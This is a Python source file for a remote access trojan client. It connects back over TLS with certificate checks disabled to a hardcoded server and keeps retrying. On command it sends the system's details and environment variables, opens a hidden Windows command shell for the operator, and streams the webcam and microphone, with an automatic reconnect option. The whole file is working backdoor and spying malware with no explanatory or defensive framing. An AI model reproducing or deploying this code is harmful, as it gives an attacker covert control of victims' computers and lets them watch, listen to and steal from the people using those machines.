import asyncio
import ssl
import os
import sys
import platform
import psutil
import subprocess
import cv2
import pyaudio

class Client:
    def __init__(self):
        self.IP = '127.0.0.1'
        self.PORT = 4747
        self.OS_VER  = platform.platform()
        self.OS_NAME = platform.system()
        self.ARCH = platform.architecture()
        self.CPU_USAGE = psutil.cpu_percent()
        self.RAM = psutil.virtual_memory().total
        self.VARS = os.environ
        self.PWD = os.getcwd()
        self.AUTOCON = False
        self.CONNECTED = False
        self.MIC = False
        self.frame = None 
        self.info = f'''
        OS        : {self.OS_NAME}
        OS_VER    : {self.OS_VER}
        ARCH      : {self.ARCH}
        CPU_USAGE : {self.CPU_USAGE}
        RAM       : {self.RAM}
        ENV       : {self.VARS}
        PWD       : {self.PWD}
        '''
        self.BuffSize = 100000000

    def start_client(self):
        asyncio.run(self.main())
    async def shell_session(self,reader, writer):

        startupinfo1 = subprocess.STARTUPINFO()
        startupinfo1.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo1.wShowWindow = subprocess.SW_HIDE
        process = await asyncio.create_subprocess_exec(
            *['cmd.exe'],
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=False,
            startupinfo=startupinfo1
        )

        await asyncio.sleep(2)
        stdout = await process.stdout.read(self.BuffSize)
        writer.write(stdout)
        await writer.drain()

        while True:
            try:
                data = await reader.read(self.BuffSize)
            except:
                #close shell
                break
            #if is send a enter
            if data.decode() == 'ENTERCOMMAND':
                process.stdin.write(b'\r\n')
                await process.stdin.drain()
                try:
                    stdout = await asyncio.wait_for(process.stdout.read(self.BuffSize), timeout=5.0)
                    writer.write(stdout)
                    await writer.drain()
                except asyncio.TimeoutError:
                    pass
                stdout = ''
                continue
            
            #other stuff
            process.stdin.write(data + b'\r\n')
            await process.stdin.drain()
            await asyncio.sleep(2)
            if data.decode() == 'exit':
                writer.write(b'shell')
                await writer.drain()
                break
            try:
                stdout = await asyncio.wait_for(process.stdout.read(self.BuffSize), timeout=5.0)
                writer.write(stdout)
                await writer.drain()
            except asyncio.TimeoutError:
                pass
            try:
                stderr = await asyncio.wait_for(process.stderr.read(self.BuffSize), timeout=2.0)
                writer.write(stderr)
                await writer.drain()
            except asyncio.TimeoutError:
                pass
            stdout = ''
            stderr = ''

    async def ConnectToServer(self):
        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        self.reader, self.writer = await asyncio.open_connection(self.IP, self.PORT, ssl=self.context)
        self.CONNECTED = True

    async def camera(self):
        data = None
        self.writer.write(b'init')
        await self.writer.drain()
        for i in range(10):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                while True:
                    try:
                        data = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.2)
                    except asyncio.TimeoutError:
                        data = None

                    if not data is None:
                        if data.decode(errors='ignore') == 'exit':
                            break

                    ret, frame = cap.read()
                    ret, data = cv2.imencode(".jpg", frame)
    
                    self.writer.write(len(data).to_bytes(4, 'big'))
                    await self.writer.drain()
                    data = data.tobytes()
                    self.writer.write(data)
                    await self.writer.drain()

                    if not ret:
                        self.writer.write(b'exit')
                        await self.writer.drain()
                        break

                cap.release()
                return
        self.writer.write(b'exit')
        await self.writer.drain() 
    
    async def microphone(self,reader, writer):
        CHUNK = 7024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()

        device_count = p.get_device_count()

        for i in range(device_count):
            device_info = p.get_device_info_by_index(i)
            if device_info["maxInputChannels"] > 0:
                self.MIC = True
                break
        
        if self.MIC:
            stream = p.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
        else:
            writer.write(b'mic')
            await writer.drain()
            writer.write(b'[-] No microphones')
            await writer.drain()
            return

        while self.MIC:
            
            try:
                msg = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.1)
                stream.close()
                return
            except asyncio.TimeoutError:
                msg = None
            
            data = stream.read(CHUNK)
            writer.write(data)
            await writer.drain()

            

        
    async def main(self):
        while True:
            try:
                await self.ConnectToServer() #first connection
                break
            except:
                continue

        while True:
            try:
                while True:
                    if self.AUTOCON == True and self.CONNECTED == False:
                        while True:
                            try:
                                await self.ConnectToServer()
                                break
                            except:
                                pass
                        continue

                    data = await self.reader.read(1024)
                    if not data:
                        if self.AUTOCON == True:
                            self.CONNECTED = False
                            continue
                        else:
                            sys.exit()
                    data = data.decode()
                    if data == 'info':
                        self.writer.write(bytes(self.info,'utf-8'))
                        await self.writer.drain()
                    elif data == 'shell':
                        await self.shell_session(self.reader,self.writer)
                    elif data == 'camera':
                        await self.camera()
                    elif data == 'mic':
                        await self.microphone(self.reader,self.writer)
                    elif data == 'autocon':
                        if self.AUTOCON == False:
                            self.AUTOCON = True
                            self.writer.write(b'\n[+] AUTOCONNECTION TRUE')
                            await self.writer.drain()
                        else:
                            self.AUTOCON = False
                            self.writer.write(b'\n[+] AUTOCONNECTION FALSE')
                            await self.writer.drain()
                    else:
                        self.writer.write(b'\n[-] I do not know the command')
                        await self.writer.drain()
            except (KeyboardInterrupt, ConnectionResetError):
                self.writer.close()
                self.CONNECTED = False
                if self.AUTOCON == True:
                    continue
                return
        

client = Client()

client.start_client()

